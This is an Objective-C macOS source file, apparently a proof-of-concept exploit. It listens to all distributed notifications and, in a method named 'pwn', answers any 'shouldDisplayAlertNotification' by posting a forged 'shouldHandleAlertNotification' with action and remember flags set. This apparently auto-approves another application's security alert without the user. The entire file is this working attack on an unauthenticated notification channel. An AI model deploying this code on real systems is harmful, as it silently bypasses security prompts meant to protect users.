#import "AppDelegate.h"

@implementation AppDelegate

- (void)start
{
	NSDistributedNotificationCenter *center = [NSDistributedNotificationCenter defaultCenter];
	
	[center addObserver:self selector:@selector(fyi:) name:nil object:nil suspensionBehavior:NSNotificationSuspensionBehaviorDeliverImmediately];
}

- (void)stop
{
	NSDistributedNotificationCenter *center = [NSDistributedNotificationCenter defaultCenter];
	
	[center removeObserver:self];
}

- (void)fyi:(NSNotification *)notification
{
	/*
	
	IMPORTANT
	
	NSDistributedNotificationCenter does not implement a secure communications protocol.
	When using distributed notifications, your app should treat any data passed in the notification as untrusted.
	See Security Overview for general guidance on secure coding practices.
	
	*/
	
	if ([notification.name isEqualToString:@"shouldDisplayAlertNotification"])
	{
		[self pwn:[notification userInfo]];
	}

	NSLog(@"%@", notification);
}

- (void)pwn:(NSDictionary *)userInfo
{
	NSDistributedNotificationCenter *center = [NSDistributedNotificationCenter defaultCenter];
	
	NSDictionary *pwnInfo = @{ @"action": @(1), @"remember": @(1), @"watchEventUUID": userInfo[@"watchEventUUID"] };
	
	[center postNotificationName:@"shouldHandleAlertNotification" object:nil userInfo:pwnInfo options:NSNotificationDeliverImmediately|NSNotificationPostToAllSessions];
}

@end
